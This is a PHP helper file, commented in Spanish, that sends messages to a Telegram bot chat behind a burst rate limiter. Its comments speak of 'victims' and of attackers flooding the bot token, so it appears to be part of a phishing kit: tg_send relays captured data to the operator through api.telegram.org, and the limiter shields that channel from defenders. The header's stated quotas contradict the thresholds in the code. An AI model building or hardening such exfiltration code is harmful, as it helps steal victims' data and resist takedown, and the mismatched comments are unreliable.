<?php
// =====================================================================
// _tg.php — Envoltura para Telegram con rate-limit duro
// Objetivo: aun cuando el atacante atraviese todas las protecciones,
// el token nunca se inunda. Cuotas:
//   - Global: 100 envíos / 24h
//   - Por IP: 2 envíos / 24h
//   - Burst:  máx 8 envíos en 5 min; si se rompe, cooldown 1h
// Si la cuota se agota, NO se envía y se loguea como descartado.
// =====================================================================

if (defined('SIM_TG_LOADED')) return;
define('SIM_TG_LOADED', true);

require_once __DIR__ . '/settings.php';

if (!function_exists('tg_send')) {

    function tg_state_dir() {
        $d = sys_get_temp_dir() . '/sim_tg_rate';
        if (!is_dir($d)) @mkdir($d, 0700, true);
        return $d;
    }

    function tg_load($file) {
        if (!is_file($file)) return null;
        $raw = @file_get_contents($file);
        if (!$raw) return null;
        $j = json_decode($raw, true);
        return is_array($j) ? $j : null;
    }

    function tg_save($file, $data) {
        @file_put_contents($file, json_encode($data), LOCK_EX);
    }

    function tg_log_drop($reason, $ip) {
        @file_put_contents(
            __DIR__ . '/tg_dropped.log',
            date('Y-m-d H:i:s') . " | $ip | $reason" . PHP_EOL,
            FILE_APPEND | LOCK_EX
        );
    }

    /**
     * Anti-flood: solo aplica el control de RÁFAGA (burst).
     * Las víctimas legítimas siempre pasan (no hay cap diario ni por IP).
     * Si en MUY POCO tiempo se reciben demasiados envíos => cooldown.
     * Esto solo se dispara bajo ataque real (alguien que bypaseó el gate HMAC).
     *
     * Devuelve true si se permite el envío; false si se debe descartar.
     */
    function tg_rate_check($ip) {
        $dir = tg_state_dir();
        $now = time();

        // Umbrales anti-ráfaga (ajustables)
        $burst_window = 60;    // ventana de medición: 60 seg
        $burst_max    = 30;    // máx 30 envíos en 60 seg
        $cooldown     = 600;   // si se rompe el burst, suspender 10 min

        $gfile = $dir . '/global.json';
        $g = tg_load($gfile) ?: ['burst_start' => $now, 'burst_count' => 0, 'cooldown_until' => 0];

        // Si está en cooldown por ráfaga previa => descartar
        if ($now < (int)($g['cooldown_until'] ?? 0)) {
            tg_log_drop('burst_cooldown_active', $ip);
            return false;
        }

        // Reset de la ventana si expiró
        if (($now - ($g['burst_start'] ?? 0)) > $burst_window) {
            $g['burst_start'] = $now;
            $g['burst_count'] = 0;
        }

        // Si ya se superó el máximo en la ventana => activar cooldown
        if (($g['burst_count'] ?? 0) >= $burst_max) {
            $g['cooldown_until'] = $now + $cooldown;
            tg_save($gfile, $g);
            tg_log_drop('burst_triggered_cooldown', $ip);
            return false;
        }

        // OK => contar y permitir
        $g['burst_count']++;
        tg_save($gfile, $g);
        return true;
    }

    /**
     * Envía un mensaje al chat configurado, sujeto a rate-limit.
     * @return bool true si se envió; false si se descartó.
     */
    function tg_send($text, $inline_keyboard = null) {
        global $token, $chat_id;
        $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

        if (!tg_rate_check($ip)) return false;

        $params = [
            'chat_id' => $chat_id,
            'text'    => $text,
        ];
        if ($inline_keyboard) {
            $params['reply_markup'] = json_encode(['inline_keyboard' => $inline_keyboard]);
        }

        $url = "https://api.telegram.org/bot$token/sendMessage?" . http_build_query($params);
        $ctx = stream_context_create(['http' => ['timeout' => 5, 'method' => 'GET']]);
        @file_get_contents($url, false, $ctx);
        return true;
    }
}
